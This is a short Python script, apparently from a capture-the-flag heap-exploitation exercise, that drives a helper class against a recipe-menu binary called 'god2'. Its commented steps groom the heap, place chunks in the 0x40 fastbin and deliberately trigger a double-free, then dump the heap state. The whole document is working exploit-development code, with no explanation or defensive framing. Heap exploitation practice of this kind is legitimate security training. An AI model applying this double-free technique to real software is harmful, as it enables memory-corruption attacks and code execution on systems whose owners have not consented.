import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
from dumper import G
g=G('god2')
g.add(b'UNIQ777',(b'0',))
g.add(b'A1'); g.add(b'B2'); g.cook(b'Beef noodles'); g.add(b'YY'); g.add(b'Z9'); g.cook(b'Beef noodles')
for t in (b'B2',b'Z9',b'A1',b'YY'): g.rm(t)
g.add(b'CC')
# drain 0x90 remainder with E, D1 ; then D3(UNIQ777)@YY with CLEAN leftover
g.cook(b'Beef noodles')   # E (idx2) @remainder
g.cook(b'Beef noodles')   # D1(idx3) @remainder
g.cook(b'UNIQ777')        # D3(idx4) @YY, D3+0x80=0 (clean leftover)
g.rm(b'UNIQ777')          # free recipe
g.rm(b'UNIQ777')          # free D3-as-recipe -> fastbin[0x40]=[D3], CC->next=0 (clean?)
g.sell(b'2')              # free E -> fastbin[0x40]=[E,D3]
g.sell(b'3')              # free D3 again -> double-free
g.dump('dish dup + clean CC->next?')
g.close()
